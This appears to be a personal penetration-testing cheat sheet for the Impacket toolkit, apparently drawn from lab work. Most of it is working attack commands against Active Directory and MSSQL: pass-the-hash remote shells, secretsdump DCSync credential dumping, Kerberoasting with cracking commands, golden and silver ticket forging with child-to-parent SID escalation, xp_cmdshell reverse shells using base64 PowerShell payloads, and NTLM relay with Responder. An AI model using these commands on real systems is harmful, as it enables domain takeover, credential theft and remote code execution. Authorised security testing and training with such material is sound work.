
# impacket

Impacket = collection of Python classes and enabling interaction with network protocols. 
- protocols featured: 
	- Ethernet, Linux "Cooked" capture.
	- IP, TCP, UDP, ICMP, IGMP, ARP.
	- IPv4 and IPv6 Support.
	- NMB and SMB1, SMB2 and SMB3 (high-level implementations).
	- MSRPC version 5, over different transports: TCP, SMB/TCP, SMB/NetBIOS and HTTP.
	- Plain, NTLM and Kerberos authentications, using password/hashes/tickets/keys.
	- Portions/full implementation of the following MSRPC interfaces: EPM, DTYPES, LSAD, LSAT, NRPC, RRP, SAMR, SRVS, WKST, SCMR, BKRP, DHCPM, EVEN6, MGMT, SASEC, TSCH, DCOM, WMI, OXABREF, NSPI, OXNSPI.
	- Portions of TDS (MSSQL) and LDAP protocol implementations.
- [github repo impacket](https://github.com/fortra/impacket)

## Useful Impacket workflows

| Goal                                        | Tool                      |
| ------------------------------------------- | ------------------------- |
| Browse SMB shares                           | `impacket-smbclient`      |
| Remote shell / service execution            | `impacket-psexec`         |
| Remote command execution via WMI            | `impacket-wmiexec`        |
| Remote command execution via SMB service    | `impacket-smbexec`        |
| Remote command execution via scheduled task | `impacket-atexec`         |
| Remote command execution via DCOM           | `impacket-dcomexec`       |
| Dump hashes / secrets                       | `impacket-secretsdump`    |
| Request Kerberos TGT                        | `impacket-getTGT`         |
| AS-REP roast                                | `impacket-GetNPUsers`     |
| Kerberoast                                  | `impacket-GetUserSPNs`    |
| Enumerate AD users                          | `impacket-GetADUsers`     |
| Enumerate users/groups via SID/RID          | `impacket-lookupsid`      |
| Find delegation misconfigs                  | `impacket-findDelegation` |
| Connect to MSSQL                            | `impacket-mssqlclient`    |
| Relay NTLM authentication                   | `impacket-ntlmrelayx`     |
| Forge Kerberos tickets                      | `impacket-ticketer`       |

 Common workflow

-> Validate access
- `impacket-smbclient`
- `impacket-mssqlclient`

-> Execute if appropriate
- `impacket-psexec`
- `impacket-wmiexec`
- `impacket-smbexec`
- `impacket-atexec`
- `impacket-dcomexec`

 -> Dump secrets after admin
- `impacket-secretsdump`

 -> Kerberos auth path
- `impacket-getTGT`
- export `KRB5CCNAME`
- use `-k -no-pass` with other Impacket tools

 -> Roasting path
- `impacket-GetNPUsers`
- `impacket-GetUserSPNs`
- crack with Hashcat or John

 -> AD enum path
- `impacket-GetADUsers`
- `impacket-lookupsid`
- `impacket-findDelegation`

 -> Handle Kerberos / relay when relevant
- `impacket-ticketer` / `ticketer.py`
- `impacket-ntlmrelayx`



## `smbclient`
- listing shares  
- browsing directories  
- uploading and downloading files

```bash
# Smbclient via Password
impacket-smbclient domain.com/username:'password'@target_ip

# Smbclient via Pass-the-Hash
impacket-smbclient domain.com/username@target_ip -hashes ntlm_hash:ntlm_hash

# Smbclient via Kerberos Ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-smbclient domain.com/username@target_ip -k -no-pass
```

```bash
# useful interactive commands in smbclient
shares  # List Available Shares
use C$  # Mount Share   
# Common Commands  
cat
ls   
cd  
mkdir  
rmdir  
put local_file.txt  # Upload File  
get remote_file.txt  # Download File     
mget *  # Download All Files from PWD
info # Return Host Information
password # Change the User's Password
```



## Remote Shell
### `psexec`

If you have Credentials with usually local admin privileges & can ...
- Authenticate over SMB.
- Write a service binary to an admin share, commonly `ADMIN$`.
- Create and start a Windows service via the Service Control Manager.
- Communicate over named pipes to get command execution.
-> use `psexec` to commonly gain shell as `NT AUTHORITY\SYSTEM` for remote execution

```bash
# Psexec via Password
impacket-psexec 'domain/user:password@target'

# Psexec via Pass-the-Hash
impacket-psexec domain.com/username@target_ip -hashes ntlm_hash:ntlm_hash
# Example PTH shell
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:ntlm_hash administrator@10.20.149.15

# Psexec via Kerberos Ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec domain.com/username@target_ip -k -no-pass

# Optional: add a specific command to execute (default: cmd.exe)
impacket-psexec domain.com/username:'password'@target_ip 'whoami'

# Save command output from `psexec`  
impacket-psexec domain.com/username:'password'@target_ip 'whoami /all' > psexec_output.txt
```

```bash
# Useful interactive commands
help  # Return Help
!<local_command>   # Execute Local Commands
lput local_file Temp # Upload Files to Temp Directory
```


### `smbexec`

- Semi-interactive command shell, commonly NOT SYSTEM
- `smbexec` = use SMB + Windows services to run commands remotely

```bash
# via Password
impacket-smbexec domain.com/user:'password'@target

# Pass-the-hash
impacket-smbexec domain.com/user@target -hashes :NTLM_HASH

# specify share
impacket-smbexec domain.com/user:'password'@target -share ADMIN$
```


### `wmiexec` 

- less noisy than `psexec` because avoids same service-creation pattern.

```bash
# Password Auth 
impacket-wmiexec domain.com/username:password@target_ip

# Pass-the-hash
impacket-wmiexec domain.com/username@target_ip -hashes :ntlm_hash

# Execute a command
impacket-wmiexec domain.com/username:password@target_ip "whoami"

# No-output mode
impacket-wmiexec domain.com/username:password@target_ip -nooutput "cmd /c calc.exe"
```


## Credential dumping

### `impacket-secretsdump`

```bash
# Password auth
impacket-secretsdump domain.com/administrator:'password'@target_ip

# Save output
impacket-secretsdump domain.com/administrator:'password'@dc01.domain.com > secretsdump.txt

# Dump from DC 
impacket-secretsdump domain.com/administrator@target_ip -hashes ntlm_hash:ntlm_hash

# Just one DC user 
impacket-secretsdump -just-dc-user krbtgt domain.com/admin:password@dc01.domain.com

# Just NTLM hashes 
impacket-secretsdump -just-dc-ntlm domain.com/admin:password@dc01.domain.com

# Output to file
impacket-secretsdump domain.com/admin:password@target_ip -outputfile hashes

# Full DCSync
impacket-secretsdump -just-dc domain.com/admin:password@dc01.domain.com

# DCSync specific user
impacket-secretsdump -just-dc-user Administrator domain.com/admin:password@dc01.domain.com

# DCSync `krbtgt`
impacket-secretsdump -just-dc-user krbtgt domain.com/admin:password@dc01.domain.com

# Local files
# From `NTDS.dit` + `SYSTEM`:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
# From `SAM` + `SYSTEM`:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
# From `SECURITY` + `SYSTEM`:
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
```

Kerberos ticket
```bash
# Dump local SAM/LSA from a machine where your ticketed user is local admin
└─$ export KRB5CCNAME=admin.ccache  
└─$ impacket-secretsdump -k -no-pass domain.com/administrator@hostname01.domain.com -target-ip target_ip

# DCsync from the domain controller via Kerberos Ticket
└─$ export KRB5CCNAME=/path/to/ticket.ccache  
└─$ impacket-secretsdump -k -no-pass domain.com/administrator@dc01.domain.com -dc-ip dc_ip
```

`impacket-secretsdump -k -no-pass` requirements  
  
| Check                       | Fast test                                    | Why it matters                                          |
| --------------------------- | -------------------------------------------- | ------------------------------------------------------- |
| Ticket exists               | `klist`                                      | Confirms `KRB5CCNAME` points to a usable Kerberos cache |
| Ticket is valid/not expired | `klist`                                      | Expired tickets will fail even if the syntax is correct |
| Correct domain/realm        | `klist` shows `USER@DOMAIN.COM`              | Ticket must match the AD domain you are attacking       |
| Target uses hostname/FQDN   | Use `dc01.domain.com`, not just IP           | Kerberos uses SPNs like `cifs/dc01.domain.com`          |
| DNS/hosts works             | `ping dc01.domain.com` or check `/etc/hosts` | Impacket must resolve the hostname to the target IP     |
| Time is synced              | `date`; compare with DC time if needed       | Kerberos fails if clock skew is too large               |
| Right privilege level       | Local admin or DCSync rights                 | `secretsdump` needs more than valid authentication      |
| Correct service ticket/SPN  | TGT or `cifs/target.domain.com` ticket       | SMB/RPC dumping usually needs CIFS access to the host   |

| Error/symptom                         | Check                                              |
| ------------------------------------- | -------------------------------------------------- |
| Cannot resolve hostname               | Add target to `/etc/hosts`                         |
| `KRB_AP_ERR_SKEW`                     | Fix time sync                                      |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN`         | Wrong hostname/SPN                                 |
| `KRB_AP_ERR_BAD_INTEGRITY`            | Wrong key/hash, bad forged ticket, or SPN mismatch |
| `STATUS_ACCESS_DENIED`                | Auth worked, privileges are insufficient           |
| Works with password/hash but not `-k` | Ticket, SPN, DNS, or realm issue                   |


## `impacket-getTGT`
- valid credentials +  NTLM hash OR AES key -> get Kerberos TGT 

```bash
# Request TGT with password
└─$ impacket-getTGT domain.com/username:password

# Request TGT with NTLM hash
└─$ impacket-getTGT domain.com/username -hashes :ntlm_hash

# Request TGT with AES key
└─$ impacket-getTGT domain.com/username -aesKey aes256key
└─$ klist
└─$ export KRB5CCNAME=username.ccache
```

## Kerberos 

### `impacket-GetNPUsers` (AS-REP roasting)


```bash
# Find users without pre-auth:
impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass

# With credentials:
impacket-GetNPUsers domain.com/username:password -request

# Specify DC IP:
impacket-GetNPUsers domain.com/username:password -dc-ip target_ip -request

# Output to file: 
impacket-GetNPUsers domain.com/username:password -request -outputfile asrep.txt

# Hashcat format:
impacket-GetNPUsers domain.com/username:password -request -format hashcat

# John format:
impacket-GetNPUsers domain.com/username:password -request -format john
```

### `impacket-GetUserSPNs` (Kerberoasting)

```bash
# Find Kerberoastable users:
impacket-GetUserSPNs domain.com/username:password

# Request tickets:
impacket-GetUserSPNs domain.com/username:password -request

# Output to file:
impacket-GetUserSPNs domain.com/username:password -request -outputfile kerberoast.txt

# Specify DC IP:
impacket-GetUserSPNs domain.com/username:password -dc-ip target_ip -request

# Pass-the-hash:
impacket-GetUserSPNs domain.com/username -hashes :ntlm_hash -request
```

```bash
#Crack Kerberos material

#AS-REP:
hashcat -m 18200 asrep.txt wordlist.txt
john --wordlist=wordlist.txt asrep.txt

#TGS / Kerberoast:
hashcat -m 13100 kerberoast.txt wordlist.txt
john --wordlist=wordlist.txt kerberoast.txt
```

### `impacket-ticketer`
- can also run using `python3` via [`ticketer.py`](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)

```bash
# GOLDEN TICKET 
impacket-ticketer -nthash krbtgt_ntlm_hash -domain-sid domain_sid -domain domain.com Administrator

# SILVER TICKET
impacket-ticketer -nthash service_ntlm_hash -domain-sid domain_sid -domain domain.com -spn MSSQLSvc/target.domain.com:1433 Administrator
```

```bash
# use forged ticket
└─$ export KRB5CCNAME=Administrator.ccache
└─$ impacket-psexec domain.com/Administrator@target.domain.com -k -no-pass
```

```bash
# GOLDEN TICKET  using  ticketer.py and psexec
# using aeskeys or ntlm from mimikatz or ntds.dit! 
└─$ python3 ticketer.py -nthash krbtgt_ntlm_hash -domain-sid domain_sid -domain domain.com Administrator
└─$ python3 ticketer.py -aesKey REDACTED_AES_KEY -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain domain.com -user-id 500 Administrator

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for domain.com/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache

└─$  export KRB5CCNAME=Administrator.ccache

└─$ head -n 5 /etc/krb5.conf                      
[libdefaults]
#       default_realm = KALI_NW.BOX
        default_realm = DOMAIN.COM

└─$ klist
Ticket cache: FILE:Administrator.ccache
Default principal: Administrator@DOMAIN.COM

Valid starting     Expires            Service principal
DATE_TIME          DATE_TIME          krbtgt/DOMAIN.COM@DOMAIN.COM
...
        
└─$  python3 psexec.py domain.com/Administrator@DC0X.domain.com -k -no-pass -dc-ip IP_DC -target-ip IP_DC
```

Watch out for SID !! 
if forging Golden Ticket from child node -> Parent node! 
```powershell
PS C:\Windows\Temp> nltest /domain_trusts
List of domain trusts:
    0: DOMAIN domain.com (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
    1: sub domain.com (NT 5) (Forest: 0) (Primary Domain) (Native)
```
- `domain.com` = forest root / parent domain
- `sub.domain.com` = child domain / your primary domain

must use extra-sid for parent domain: SID-child-domain-**519**
```bash
└─$ python3 ticketer.py -aesKey REDACTED_AES_KEY -domain-sidS-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain domain.com -user-id 500 -extra-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-519 -extra-pac Administrator

└─$  export KRB5CCNAME=Administrator.ccache
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali_name.box      kali_name 
IP_DC01 dc01.domain.com domain.com
IP_DC02 dc02.domain.com domain.com

└─$ python3 psexec.py domain.com/Administrator@DC01.domain.com -k -no-pass

PS C:\Windows\system32> cat C:\Users\Administrator\Desktop\proof.txt
xxxx
```


### `mssql`

- SQL authentication
- Windows-authenticated SQL access
- SQL Server enumeration
- command execution via `xp_cmdshell` when enabled and permitted

```bash
# Connect to MS-SQL Server
impacket-mssqlclient username:'password'@target_ip

# Connect to MS-SQL Server via default SA creds
impacket-mssqlclient sa:'password'@target_ip

# Pass-the-hash with Windows auth
impacket-mssqlclient domain.com/username:'password'@target_ip -windows-auth

# Connect to a specific database
impacket-mssqlclient domain.com/username:'password'@target_ip -windows-auth -db master

# Pass-the-hash with Windows auth
impacket-mssqlclient domain.com/username@target_ip -hashes :ntlm_hash -windows-auth
```

Enable `xp_cmdshell`
```sql
# Enable XP_CMDSHELL for Remote Code Exection
> EXECUTE sp_configure 'show advanced options', 1;
> RECONFIGURE;
> EXECUTE sp_configure 'xp_cmdshell', 1;
> RECONFIGURE;
> xp_cmdshell 'whoami'
```


Example SQL commands
```sql
-- `SYSTEM_USER` → how SQL authenticated you (SQL vs Windows)
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- `ORIGINAL_LOGIN()` → useful if you’re impersonating another login
SELECT ORIGINAL_LOGIN();
SELECT IS_SRVROLEMEMBER('sysadmin');
-- `1` → full SQL control (very significant)
-- `0` → limited, but still useful

SELECT @@version;
SELECT name FROM sys.server_principals;
SELECT name FROM sys.databases;
SELECT name, database_id FROM sys.databases;
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM sys.servers;
SELECT servicename, service_account FROM sys.dm_server_services;
```

Dangerous features
```sql
SELECT name, value_in_use
FROM sys.configurations
WHERE name IN ('xp_cmdshell', 'Ole Automation Procedures');
-- `value_in_use = 1` → already enabled (big deal)
-- `0` → might still be enable-able if privileged
```

SQL query
```sql
-- List databases    
SELECT * FROM master.sys.databases
SELECT name, database_id FROM sys.databases;

-- Permission enumeration (if  not sysadmin)
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

-- Check for linked servers
SELECT * FROM sys.servers;

-- Find service accounts
SELECT servicename, service_account FROM sys.dm_server_services;

-- File read capability test
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents 


-- privilege escalation using misconfiguration
-- sa = highest-privileged SQL login
-- Impersonation check
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name LIKE 'IMPERSONATE%';  
EXECUTE AS LOGIN = 'sa';  
SELECT SYSTEM_USER;  
REVERT;

-- Read credentials from backend jobs
USE msdb;
SELECT name, enabled FROM dbo.sysjobs;

SELECT j.name AS job_name, s.step_id, s.step_name, s.subsystem, s.command
FROM dbo.sysjobsteps s
JOIN dbo.sysjobs j ON s.job_id = j.job_id
ORDER BY j.name, s.step_id;
```

e.g. reverse shell path
```bash
impacket-mssqlclient sa:"password"@target_ip
```

get reverse shell using impacket-mssql 
https://www.revshells.com/ -> PowerShell #3 (Base64)
```sql
SQL (xxx@master)> enable_xp_cmdshell    

INFO(HOSTNAME\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(HOSTNAME\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.

SQL (sa  dbo@master)> xp_cmdshell powershell -e BASE64_PAYLOAD
```




## `impacket-ntlmrelayx`
- win user/system tries to authenticate to you -> relay NTLM request to another machine/system

```bash
impacket-ntlmrelayx -tf targets.txt

# Relay to SMB
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay and execute a command
impacket-ntlmrelayx -tf targets.txt -c "whoami"

# Dump SAM on relay
impacket-ntlmrelayx -tf targets.txt -smb2support --sam

# Relay to LDAP
impacket-ntlmrelayx -t ldap://dc01.domain.com
```

```bash
# Example relay with encoded command
└─$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t target_ip -c "powershell -enc BASE64_PAYLOAD"
```

Common Responder workflow
1. Edit `Responder.conf` and disable SMB / HTTP servers if needed
2. 

```bash
responder -I eth0
```

3. 
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```




## LDAP / AD query tools

### `impacket-GetADUsers`

- enumerate AD users from LDAP.

```bash
# List all users
impacket-GetADUsers domain.com/username:password -all

# Specify DC IP
impacket-GetADUsers domain.com/username:password -dc-ip target_ip -all

# Pass-the-hash
impacket-GetADUsers domain.com/username -hashes :ntlm_hash -all
```

### `impacket-lookupsid`

- Useful for SID brute-force based user/group discovery.

```bash
impacket-lookupsid domain.com/username:password@target_ip

# Specify RID range upper bound
impacket-lookupsid domain.com/username:password@target_ip 20000
```

### `impacket-findDelegation`

- Useful for finding delegation settings in Active Directory.

```bash
impacket-findDelegation domain.com/username:password -dc-ip target_ip
```



-----
## Related notes

- [[netexec|NetExec]]  
- [[evil-winrm|Evil-WinRM]]  
- [[mimikatz|Mimikatz]]  

helpful reference links 
- https://rgbwiki.com/Red%20Cell/14.%20Cheatsheets/Tools/Impacket%20Cheatsheet/